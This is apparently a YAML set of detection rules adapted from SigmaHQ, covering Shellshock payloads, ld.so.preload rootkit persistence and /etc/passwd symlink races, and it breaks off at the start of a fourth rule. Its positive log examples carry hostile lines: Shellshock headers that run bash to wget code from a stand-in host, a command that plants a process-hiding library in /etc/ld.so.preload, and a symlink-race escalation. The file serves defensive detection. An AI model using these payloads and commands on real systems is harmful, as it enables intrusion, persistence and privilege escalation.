- id: mention.sigma_shellshock
  title: Shellshock function-definition expression (Sigma "Shellshock Expression")
  match:
    literal: ['(){:;};', '() {:;};', '() { :;};', '() { :; };']
  case_sensitive: false
  strength: strong
  attack: [T1190]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Shellshock Expression (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shellshock.yml
    license: DRL-1.1
    upstream_id: c67e0c98-4d39-46ee-8f6b-437ebf6b950e
  rationale: >-
    The empty bash function definition is the CVE-2014-6271 trigger. In web, DHCP or mail logs it is an exploitation
    attempt (often internet-wide scanning); legitimate traffic never carries it in headers or parameters.
  examples:
    positive:
      - '203.0.113.50 - - [20/Nov/2026:14:00:00 +0000] "GET /cgi-bin/status HTTP/1.1" 404 196 "-" "() { :; }; /bin/bash -c \"wget http://203.0.113.50/x\""'
      - '203.0.113.71 - - [21/Nov/2026:09:01:11 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "(){:;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
      - '203.0.113.71 - - [21/Nov/2026:09:01:12 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "() {:;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
      - '203.0.113.71 - - [21/Nov/2026:09:01:13 +0000] "GET /cgi-bin/status HTTP/1.1" 400 0 "-" "() { :;}; /bin/bash -c ''wget http://203.0.113.50/x''"'
    negative:
      - '10.0.3.8 - - [20/Nov/2026:14:01:00 +0000] "GET /app.js?v=() HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
      - 'Nov 20 14:02:00 web01 bash[663]: HISTORY: f() { echo hi; }; f'

- id: mention.sigma_ld_so_preload
  title: '/etc/ld.so.preload path text (Sigma "Code Injection by ld.so Preload")'
  match:
    literal: ['/etc/ld.so.preload']
  case_sensitive: false
  strength: medium
  attack: [T1574.006]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Code Injection by ld.so Preload (Christian Burkard, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_ldso_preload_injection.yml
    license: DRL-1.1
    upstream_id: 7e3c4651-c347-40c4-b1d4-d48590fdf684
  rationale: >-
    The global preload file is the persistence point of LD_PRELOAD rootkits (Azazel, Jynx, libprocesshider) and
    cryptominer kits. The loader also names it in its own 'cannot be preloaded' errors and a few vendor agents ship
    preload libraries, so the mention is medium.
  examples:
    positive:
      - 'Nov 20 14:03:00 web01 bash[664]: HISTORY: echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload'
    negative:
      - 'Nov 20 14:04:00 web01 bash[665]: HISTORY: cat /etc/ld.so.conf.d/libc.conf'
      - 'Nov 20 14:05:00 web01 ldconfig[700]: ldconfig: /etc/ld.so.conf.d/x86_64-linux-gnu.conf: updated cache'

- id: mention.sigma_symlink_etc_passwd
  title: Symlink to /etc/passwd (Sigma "Symlink Etc Passwd")
  match:
    literal: ['ln -s -f /etc/passwd', 'ln -s /etc/passwd']
  case_sensitive: false
  strength: strong
  attack: [T1068]
  telemetry: [linux_text]
  source:
    name: 'SigmaHQ: Symlink Etc Passwd (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_symlink_etc_passwd.yml
    license: DRL-1.1
    upstream_id: c67fc22a-0be5-4b4f-aad5-2b32c4b69523
  rationale: >-
    Pointing a symlink at /etc/passwd sets up a privileged program to write through it, a classic symlink-race
    privilege escalation. Administrators edit /etc/passwd with vipw or usermod, never through a link.
  examples:
    positive:
      - 'Nov 20 14:06:00 web01 bash[666]: HISTORY: ln -s /etc/passwd /tmp/logfile; ./vuln-setuid'
      - 'Nov 21 09:01:14 web01 bash[4100]: HISTORY: ln -s -f /etc/passwd /tmp/logfile'
    negative:
      - 'Nov 20 14:07:00 web01 bash[667]: HISTORY: ln -s /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app'
      - 'Nov 20 14:08:00 web01 bash[668]: HISTORY: grep alice /etc/passwd'

- id: mention.sigma_bpf_probe_write_user
